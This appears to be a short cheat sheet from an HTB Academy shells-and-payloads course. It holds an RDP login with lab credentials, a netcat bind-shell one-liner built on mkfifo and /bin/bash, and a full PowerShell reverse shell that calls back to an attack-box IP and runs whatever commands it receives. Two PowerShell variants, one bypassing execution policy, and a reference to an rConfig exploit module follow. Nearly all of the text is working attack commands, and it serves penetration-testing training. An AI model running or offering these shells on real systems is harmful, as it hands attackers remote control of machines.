...
xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!	          # CLI-based tool used to connect to a Windows target using the RDP
...
# Uses netcat to bind a shell (/bin/bash) the specified IP address and port. 
# This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f	

# Powershell one-liner used to connect back to a listener that has been started on an attack box:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.219',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"	

# more
powershell -nop -ExecutionPolicy Bypass -c "
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.219',443);
...
# exploit module that can be used to optain a reverse shell on a vulnerable linux system hosting rConfig 3.9.6
